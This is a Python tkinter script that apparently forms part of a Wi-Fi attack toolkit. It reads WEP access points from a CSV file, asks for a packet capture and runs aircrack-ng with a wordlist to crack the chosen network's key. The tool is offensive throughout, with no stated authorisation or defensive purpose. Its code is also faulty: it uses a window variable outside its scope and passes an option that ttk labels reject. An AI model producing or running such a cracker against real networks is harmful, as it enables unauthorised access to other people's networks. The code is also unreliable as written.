import tkinter as tk
from tkinter import ttk
from tkinter import messagebox, filedialog
import subprocess
import threading
import csv
import os

def load_wep_aps():
    wep_aps = []
    try:
        with open("access_points.csv", "r") as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                if row['Encryption'].upper().startswith('WEP'):
                    wep_aps.append(row)
    except FileNotFoundError:
        messagebox.showerror("Error", "Access points file not found. Please run enumeration first.")
    return wep_aps

def crack_wep_gui():
    wep_aps = load_wep_aps()
    if not wep_aps:
        messagebox.showinfo("Info", "No WEP APs found. Please enumerate access points first.")
        return
    
    selection_window = tk.Toplevel()
    selection_window.title("Select WEP AP to Crack")
    ttk.Label(selection_window, text="Select a WEP AP:").pack(pady=5)

    ap_var = tk.StringVar(selection_window)
    # Ensure there is at least one AP to select, or provide a default value
    ap_dropdown = ttk.OptionMenu(selection_window, ap_var, *(ap['ESSID'] for ap in wep_aps))
    ap_dropdown.pack()

    ttk.Button(selection_window, text="Proceed", command=lambda: proceed_with_cracking(ap_var.get(), wep_aps)).pack(pady=10)

def proceed_with_cracking(selected_essid, wep_aps):
    selected_ap = next((ap for ap in wep_aps if ap['ESSID'] == selected_essid), None)
    if not selected_ap:
        messagebox.showerror("Error", "Please select an AP.")
        return
    cap_file_path = filedialog.askopenfilename(title="Select .cap File", filetypes=[("CAP files", "*.cap")])
    if not cap_file_path:
        messagebox.showinfo("Info", "No file selected.")
        return
    crack_status_window = tk.Toplevel()
    crack_status_window.title("Cracking Status")
    status_label = ttk.Label(crack_status_window, text=f"Cracking {selected_ap['ESSID']}...")
    status_label.pack()

    threading.Thread(target=lambda: crack_wep(cap_file_path, selected_ap)).start()

def crack_wep(cap_file_path, selected_ap):
    wordlist_path = "wordlist.txt"
    if not os.path.exists(wordlist_path):
        messagebox.showerror("Error", "Wordlist file not found.")
        return

    cmd = ["aircrack-ng", cap_file_path, "-w", wordlist_path, "-b", selected_ap['BSSID']]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    output, errors = process.communicate()
    
    if "KEY FOUND" in output:
        ttk.Label(crack_status_window, text="WEP Key Found!", fg="green").pack()
        ttk.Label(crack_status_window, text=output).pack()
    else:
        ttk.Label(crack_status_window, text="Failed to crack WEP key.", fg="red").pack()
        ttk.Label(crack_status_window, text=errors).pack()